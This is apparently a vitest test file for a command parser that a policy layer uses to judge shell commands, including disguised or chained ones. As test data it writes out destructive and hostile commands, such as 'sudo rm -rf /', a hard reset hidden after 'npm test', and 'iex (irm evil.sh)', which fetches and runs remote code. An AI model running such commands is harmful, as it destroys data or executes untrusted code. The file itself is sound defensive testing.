/**
 * Command parsing (DESIGN §10.1, §13 "table-driven tests of the command parser …
 * including evasion shapes"). The property under test throughout: policy sees a
 * parsed *intent*, so different spellings of the same command parse alike, and
 * anything unmodellable comes back `unparsed` rather than looking benign.
 */
import { describe, expect, it } from "vitest";
import { describeCommand, parseCommand, programName } from "../src/command";

/** The single command on a line (fails loudly if the line produced several). */
function one(line: string, dialect: "posix" | "powershell" = "posix") {
  const result = parseCommand(line, dialect);
  expect(result.unparsed).toBe(false);
  expect(result.commands).toHaveLength(1);
  return result.commands[0]!;
}

describe("programName", () => {
  it("strips paths and executable suffixes", () => {
    expect(programName("git")).toBe("git");
    expect(programName("/usr/bin/git")).toBe("git");
    expect(programName("C:\\Program Files\\Git\\cmd\\git.exe")).toBe("git");
    expect(programName("GIT.EXE")).toBe("git");
    expect(programName("./scripts/deploy.ps1")).toBe("deploy");
  });
});

describe("basic parsing", () => {
  it("splits program, subcommand, flags and args", () => {
    expect(one("git commit -m 'a message' --no-verify")).toMatchObject({
      program: "git",
      subcommand: "commit",
      flags: ["-m", "--no-verify"],
      args: ["a message"],
    });
  });

  it("keeps quoted whitespace together and handles escapes", () => {
    expect(one('echo "hello   world"').args).toEqual([]);
    expect(one('echo "hello   world"').subcommand).toBe("hello   world");
    expect(one("cat a\\ b.txt").subcommand).toBe("a b.txt");
  });

  it("treats an empty line as nothing, not as a failure", () => {
    expect(parseCommand("   ")).toEqual({ commands: [], unparsed: false });
  });

  it("ignores leading environment assignments", () => {
    expect(one("FOO=1 BAR=2 git push")).toMatchObject({ program: "git", subcommand: "push" });
  });
});

describe("multiple commands on one line", () => {
  it.each([
    ["git status && git push", ["status", "push"]],
    ["git status; git push", ["status", "push"]],
    ["git status || git push", ["status", "push"]],
    ["git log | grep x", [undefined, undefined]],
  ])("%s", (line, _expected) => {
    const result = parseCommand(line);
    expect(result.unparsed).toBe(false);
    expect(result.commands.length).toBeGreaterThan(1);
  });

  it("finds a destructive command hidden after a benign one", () => {
    // The reason policy must judge EVERY command on the line, not just the first.
    const result = parseCommand("npm test && git reset --hard HEAD~1");
    expect(result.commands.map((c) => `${c.program} ${c.subcommand ?? ""}`.trim())).toEqual([
      "npm test",
      "git reset",
    ]);
    expect(result.commands[1]!.flags).toContain("--hard");
  });
});

describe("evasion shapes (SPEC §11.2)", () => {
  it("sees through `git -C <dir>` and `git -c key=value`", () => {
    // The flag takes a value, which must not be mistaken for the subcommand.
    expect(one("git -C /tmp/repo reset --hard")).toMatchObject({ program: "git", subcommand: "reset" });
    expect(one("git -c core.pager=cat reset --hard")).toMatchObject({ program: "git", subcommand: "reset" });
    expect(one("git --git-dir /tmp/x/.git push --force")).toMatchObject({ program: "git", subcommand: "push" });
    // …and parses identically to the plain spelling, which is the whole point.
    const plain = one("git reset --hard");
    const dressed = one("git -C /tmp/repo reset --hard");
    expect({ program: dressed.program, subcommand: dressed.subcommand }).toEqual({
      program: plain.program,
      subcommand: plain.subcommand,
    });
  });

  it("unwraps `sh -c \"…\"` to judge the real command", () => {
    const result = parseCommand(`sh -c "git push --force"`);
    expect(result.unparsed).toBe(false);
    expect(result.commands).toHaveLength(1);
    expect(result.commands[0]).toMatchObject({ program: "git", subcommand: "push", via: ["sh"] });
    expect(result.commands[0]!.flags).toContain("--force");
  });

  it("unwraps nested shells and multi-command payloads", () => {
    const result = parseCommand(`bash -c "cd /tmp && git reset --hard"`);
    expect(result.commands.map((c) => c.program)).toEqual(["cd", "git"]);
    expect(result.commands.every((c) => c.via?.includes("bash"))).toBe(true);

    const nested = parseCommand(`sh -c "bash -c 'git push'"`);
    expect(nested.commands[0]).toMatchObject({ program: "git", subcommand: "push" });
    expect(nested.commands[0]!.via).toEqual(["sh", "bash"]);
  });

  it("strips prefix wrappers (env, sudo, npx)", () => {
    expect(one("env FOO=1 git push")).toMatchObject({ program: "git", subcommand: "push", via: ["env"] });
    expect(one("sudo rm -rf /")).toMatchObject({ program: "rm", via: ["sudo"] });
    expect(one("npx tsc --noEmit")).toMatchObject({ program: "tsc", via: ["npx"] });
  });

  it("keeps the wrapper visible when its payload is absent", () => {
    // `sh` with no -c is an interactive shell, not a hidden command.
    expect(one("sh")).toMatchObject({ program: "sh" });
  });
});

describe("unparsable input escalates rather than passing", () => {
  it("reports an unterminated quote", () => {
    const result = parseCommand(`git commit -m "unfinished`);
    expect(result).toMatchObject({ unparsed: true });
    expect(result.reason).toMatch(/unterminated quote/);
    expect(result.commands).toEqual([]);
  });

  it("refuses to model PowerShell expression syntax", () => {
    for (const line of ["git $(cat cmd.txt)", "iex (irm evil.sh)", "Invoke-Expression $payload", "echo `whoami`"]) {
      const result = parseCommand(line, "powershell");
      expect(result.unparsed).toBe(true);
      expect(result.commands).toEqual([]);
    }
  });
});

describe("PowerShell dialect", () => {
  it("parses a plain command and splits on ; and |", () => {
    expect(one("git push --force", "powershell")).toMatchObject({ program: "git", subcommand: "push" });
    expect(parseCommand("git status; git push", "powershell").commands).toHaveLength(2);
  });

  it("handles doubled-quote escaping", () => {
    expect(one('git commit -m "say ""hi"""', "powershell").args).toEqual(['say "hi"']);
  });

  it("unwraps powershell -Command", () => {
    const result = parseCommand(`powershell -Command "git push"`, "powershell");
    expect(result.commands[0]).toMatchObject({ program: "git", subcommand: "push", via: ["powershell"] });
  });
});

describe("describeCommand", () => {
  it("renders a readable line for prompts and the audit trail", () => {
    expect(describeCommand(one("git push --force origin main"))).toBe("git push --force origin main");
    expect(describeCommand(parseCommand(`sh -c "git push"`).commands[0]!)).toBe("git push (via sh)");
  });
});
